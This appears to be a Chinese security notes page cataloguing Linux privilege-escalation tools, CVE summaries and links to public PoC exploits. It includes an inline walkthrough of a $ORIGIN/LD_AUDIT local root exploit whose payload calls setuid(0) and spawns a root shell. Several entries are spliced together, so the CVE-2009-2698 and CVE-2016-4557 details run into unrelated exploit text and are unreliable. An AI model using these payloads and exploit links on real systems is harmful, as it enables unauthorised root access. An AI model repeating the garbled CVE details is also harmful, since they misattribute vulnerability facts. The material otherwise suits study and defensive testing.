# OS - Exploits
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* **[Linux](#linux)**
    * [系统漏洞提权](#系统漏洞提权)
    * [原生软件提权](#原生软件提权)
    * [系统配置提权](#系统配置提权)
        * [sudo](#sudo)
        * [suid](#suid)
    * [远程漏洞](#远程漏洞)
* **[Windows](#windows)**
    * [系统漏洞提权](#系统漏洞提权)
    * [远程漏洞](#远程漏洞)
    * [域](#域)
    * [其他](#其他)
* **[FreeBSD](#freebsd)**
* **[OpenBSD](#openbsd)**
* **[Solaris](#solaris)**
---
## Linux
**相关资源**
- [carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) - 非常好用,可以直接下载 linpeas.sh 运行
- [xairy/linux-kernel-exploitation](https://github.com/xairy/linux-kernel-exploitation)
- [xairy/kernel-exploits](https://github.com/xairy/kernel-exploits)
- [SecWiki/linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)
- [Al1ex/LinuxEelvation](https://github.com/Al1ex/LinuxEelvation)
- [bsauce/kernel-exploit-factory](https://github.com/bsauce/kernel-exploit-factory)
**相关文章**
- [年报解读｜年度高可利用漏洞——Linux提权漏洞](https://mp.weixin.qq.com/s/sQBHTe_rfHMmnPjhlHAU-w)
### 内核漏洞提权
**文章教程**
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Local Linux Enumeration & Privilege Escalation Cheatsheet](https://www.rebootuser.com/?p=1623)
**提权辅助工具**
- [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
- [rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) - 辅助信息收集脚本
- [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) - 在没有 root 权限的情况下监视 linux 进程
- [TH3xACE/SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) - 一个用来识别和利用 sudo 规则的错误配置和漏洞的工具
- [liamg/traitor](https://github.com/liamg/traitor) - Automatic Linux privesc via exploitation of low-hanging fruit e.g. gtfobins, pwnkit, dirty pipe, +w docker.sock
---
> 以下工具长期未更新,不推荐
- [sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) - 长期未更新，不推荐
- [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) - 长期未更新，不推荐
- [Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack) - 长期未更新，不推荐
- [InteliSecureLabs/Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) - 长期未更新，不推荐
**CVE-2009-2698**
- 简介
    在 2.6.19 之前 Linux 内核中的(1) net/ipv4/udp.c 和(2) net/ipv6/udp.c 中的 udp 实现中的 udp_sendmsg 函数允许本地用户通过涉及 MSG_MORE 标志和 UDP 套接字的向量获得特权或导致拒绝服务(空指针取消引用和系统崩溃)。
- 影响范围
    - Linux kernel  /tmp/exploit/target*
    # 删除之前所创建的目录
    $ rm -rf /tmp/exploit/
    # /proc链接仍存在，但已标记为已被删除
    $ ls -l /proc/$$/fd/3
    lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target (deleted)
    # 使用负载DSO替换目录，使$ORIGIN成为到dlopen()的有效目标
    $ cat > payload.c
    void __attribute__((constructor)) init()
    {
    setuid(0);
    system("/bin/bash");
    }
    ^D
    $ gcc -w -fPIC -shared -o /tmp/exploit payload.c
    $ ls -l /tmp/exploit
    -rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*
    # 通过LD_AUDIT强制/proc中的链接加载$ORIGIN
    $ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
    sh-4.1# whoami
    root
    sh-4.1# id
    uid=0(root) gid=500(taviso)
    ```
**CVE-2016-4557**
- 简介
    Linuxkernel 是美国 Linux 基金会发布的开源操作系统 Linux 所使用的内核。NFSv4implementation 是其中的一个分布式文件系统协议。Linuxkernel4.5.5 之前版本的 kernel/bpf/verifier.c 文件中的‘replace_map_fd_with_map_ptr’函数存在安全漏洞，该漏洞源于程序没有正确维持 fd 数据结构体。本地攻击者可借助引用不正确文件描述符的 BPF 指令利用该漏洞获取权限或造成拒绝服务（释放后重用）。
- 影响范围
    - Linux kernel mmap_base。在 x86_64 下，如果越界超过 128MB，则会覆盖到程序的栈，进而可能导致权限提升。
- 影响范围
    - centos < 7.1708
    - redhat < 7.4
- POC | Payload | exp
    - https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
**CVE-20171000405 Huge Dirty COW**
- 简介
    安全团队 Bindecy 爆出名为大脏牛（HugeDirty Cow）的内核提权漏洞，编号为 CVE-20171000405。包含 linux 内核（2.6.38~4.14）的服务器，桌面，移动等众多设备将面临严重挑战，数以百万计的用户受到安全威胁。该漏洞是由于对之前的内核提权漏洞（cve-2016-5195）修补不完整引发
- 影响范围
    - 2.6.38 <= Linux kernel <= 4.14
- 相关文章
    - ["Huge Dirty COW" (CVE-2017-1000405)](https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0)
- POC | Payload | exp
    - [bindecy/HugeDirtyCowPOC](https://github.com/bindecy/HugeDirtyCowPOC)
**CVE-2019-13272 Linux 4.10 < 5.1.17 PTRACE_TRACEME local root**
- 简介
    在 5.1.17 之前的 Linux 内核中，kernel/ptrace.c 中的 ptrace_link 在记录想要创建 ptrace 关系的进程的凭证时处理不当，这使得本地用户可以通过利用某些具有父子进程关系的场景获得 root 权限，其中父进程放弃权限并调用 execve（可能允许攻击者控制）。一个促成因素是对象寿命问题。另一个因素是不正确地将 ptrace 关系标记为特权，这可以通过（例如）PTRACE_TRACEME 的 Polkexec 帮助程序来利用。注意：在某些环境中，SELinux deny_ptrace 可能是一个可用的变通方法。
- 相关文章
    - [CVE-2019-13272：Linux本地内核提权漏洞复现](https://cloud.tencent.com/developer/article/1528508)
- POC | Payload | exp
    - [jas502n/CVE-2019-13272](https://github.com/jas502n/CVE-2019-13272)
    - https://github.com/firebroo/sec_tools/tree/master/linux-kernel-exploits/CVE-2019-13272
**CVE-2020-8835 Linux Kernel 信息泄漏/权限提升**
- 简介
    漏洞是因为 bpf 验证程序没有正确计算一些特定操作的寄存器范围，导致寄存器边界计算不正确，进而引发越界读取和写入。该漏洞在 Linux Kernelcommit(581738a681b6) 中引入。
- 相关文章
    - [CVE-2020-8835 Linux Kernel 信息泄漏/权限提升漏洞分析](https://paper.seebug.org/1185/)
- POC | Payload | exp
    - [Exploit CVE-2020-8835](https://gist.github.com/d4em0n/e8d209e786f63493339f2ddef4d44e3d)
**CVE-2020-14386**
- 相关文章
    - [CVE-2020-14386 POC复现](https://www.cnblogs.com/yisumi/p/14366168.html)
- POC | Payload | exp
    - [cgwalters/cve-2020-14386](https://github.com/cgwalters/cve-2020-14386)
**CVE-2021-3490**
- 简介
    该漏洞源于按位操作（AND，OR 和 XOR）的 eBPF ALU32 边界跟踪不会更新 32 位边界，攻击者可利用该漏洞触发越界读写，从而从普通权限提升到 root 权限。
- POC | Payload | exp
    - [chompie1337/Linux_LPE_eBPF_CVE-2021-3490](https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490)
**CVE-2021-3493**
- 相关文章
    - [Linux kernel特权提升漏洞(CVE-2021-3493)复现](https://mp.weixin.qq.com/s/D2LM7OUvbiNYXfPG-peU3A)
- POC | Payload | exp
    - [briskets/CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)
**CVE-2021-22555**
- 相关文章
    - [隐藏十五年的漏洞：CVE-2021-22555 漏洞分析与复现](https://www.freebuf.com/articles/system/286366.html)
- POC | Payload | exp
    - [veritas501/CVE-2021-22555-PipeVersion](https://github.com/veritas501/CVE-2021-22555-PipeVersion)
**CVE-2022-0185**
- 相关文章
    - [LINUX内核漏洞——CVE-2022-0185分析与思考](http://blog.nsfocus.net/linux-cve-2022-0185/)
- POC | Payload | exp
    - [chenaotian/CVE-2022-0185](https://github.com/chenaotian/CVE-2022-0185)
    - [veritas501/CVE-2022-0185-PipeVersion](https://github.com/veritas501/CVE-2022-0185-PipeVersion)
**CVE-2021-31440 Linux 内核eBPF提权漏洞**
- 相关文章
    - [CVE-2021-31440：Linux 内核eBPF提权漏洞分析（Pwn2Own 2021）](https://www.anquanke.com/post/id/242567)
**CVE-2021-33909**
- POC | Payload | exp
    - [Liang2580/CVE-2021-33909](https://github.com/Liang2580/CVE-2021-33909)